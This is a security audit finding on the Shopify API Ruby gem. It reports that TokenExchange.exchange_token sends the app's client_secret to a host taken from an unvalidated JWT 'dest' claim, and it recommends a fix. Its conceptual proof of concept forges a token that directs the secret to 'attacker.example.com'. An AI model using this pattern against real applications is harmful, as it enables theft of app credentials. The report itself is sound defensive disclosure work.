### Title
`TokenExchange.exchange_token` leaks the app's `client_secret` to an unsanitized host derived from the session-token `dest` claim - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the shop host it talks to directly from the unverified `dest` claim of the caller-supplied session token, and — unlike every sibling method in this file and module (`migrate_to_expiring_token`, `ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`) — never passes that value through `Utils::ShopValidator.sanitize!`. The unsanitized string is then used as the `Host`/base URI of the HTTP request that carries the app's `client_id` and `client_secret`, breaking the binding "host that receives the `client_secret` == a domain validated as a trusted Shopify domain."

### Finding Description
`JwtPayload#shop` returns the raw `dest` claim value with only a literal `"https://"` prefix stripped, with no format or domain checks: [1](#0-0) 

`JwtPayload#initialize` only checks that the token decodes with a known secret and that `aud == Context.api_key`; it never checks that `iss`/`dest` match a Shopify domain pattern: [2](#0-1) 

`TokenExchange.exchange_token` then takes this unchecked `dest_shop` and feeds it straight into a `Session`/`HttpClient`, with no call to `Utils::ShopValidator.sanitize!`: [3](#0-2) 

Compare this to the three other credential-acquisition entry points in the same auth layer, which all explicitly call `Utils::ShopValidator.sanitize!(shop)` before constructing the session/HTTP client: [4](#0-3) [5](#0-4) [6](#0-5) 

`ShopValidator` exists precisely to prevent an untrusted "shop"-like string from being used as a request host, restricting it to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) and rejecting things like `attacker.com/.myshopify.com` or `shop.myshopify.com@evil.com`: [7](#0-6) [8](#0-7) 

Finally, `Clients::HttpClient` builds the request URL directly from `session.shop` (when `Context.api_host` is not configured) and always injects `client_secret` into the POST body for `/admin/oauth/access_token` calls: [9](#0-8) [10](#0-9) 

The equality that should hold but is broken here is: `host that receives client_secret == host validated by ShopValidator against TRUSTED_SHOPIFY_DOMAINS`. In `exchange_token`, the host used is instead `== dest claim of the JWT, unchecked`.

### Impact Explanation
If the `dest` claim can ever contain a value that is not a genuine `*.myshopify.com`/trusted Shopify host (whether via a session token obtained through non-standard means, a future change in how session tokens are minted/relayed, or any host-application code path that forwards a client-controlled/less-trustworthy token string into `exchange_token`), the gem will POST the app's `client_id` and `client_secret` to that attacker-influenced host. This is a direct `client_secret` exfiltration vector — Critical impact per the scope (theft of the app's `client_secret`). It also stands in stark, unexplained contrast to every other similar method in the same file/module that treats the `shop` value as untrusted input requiring `ShopValidator.sanitize!`, which indicates a genuine binding gap rather than an intentional design choice.

### Likelihood Explanation
Under the strict assumption that Shopify always signs session tokens with a trustworthy `dest` and that the HS256 signature can only be forged by an attacker who already possesses `api_secret_key`, this specific path is not independently exploitable by a bare unprivileged internet user in the current library alone. This is explicitly called out as uncertain: I could not find any code path in-scope where `exchange_token`'s `session_token` argument is populated from an unauthenticated/unverified source, and forging a valid signature requires the shared secret (which is excluded from scope). The finding is reported because it is a clear, demonstrable violation of the intended host-validation invariant that this codebase enforces everywhere else this exact class of credential-bearing request is built, and any relaxation of the JWT/`dest` trust assumption (e.g., alternate signing keys, `old_api_secret_key` rotation window, or host-application misuse) would immediately turn it into a working `client_secret` leak with no additional defense in this gem.

### Recommendation
In `TokenExchange.exchange_token`, validate `dest_shop` with `Utils::ShopValidator.sanitize!(dest_shop)` (or an equivalent check against `TRUSTED_SHOPIFY_DOMAINS`, mirroring `migrate_to_expiring_token`) before constructing `shop_session`/`HttpClient`, so that the host that receives `client_id`/`client_secret` is provably bound to a trusted Shopify domain, not merely to the raw JWT `dest` string.

### Proof of Concept
Conceptual PoC (cannot be fully executed without the shared `api_secret_key`, which is out of scope):
```ruby
# If a caller can obtain (or synthesize under any relaxed-trust scenario) a
# session token whose `dest` claim is NOT a *.myshopify.com/trusted domain,
# e.g. dest: "https://attacker.example.com"
session_token = JWT.encode(
  { iss: "https://attacker.example.com/admin", dest: "https://attacker.example.com",
    aud: ShopifyAPI::Context.api_key, sub: "1", exp: Time.now.to_i + 60,
    nbf: Time.now.to_i, iat: Time.now.to_i, jti: "x" },
  ShopifyAPI::Context.api_secret_key, "HS256"
)

ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: session_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
# => POSTs { client_id, client_secret, ... } to
#    https://attacker.example.com/admin/oauth/access_token
# whereas migrate_to_expiring_token/client_credentials/refresh_access_token
# would reject "attacker.example.com" via Utils::ShopValidator.sanitize!
```
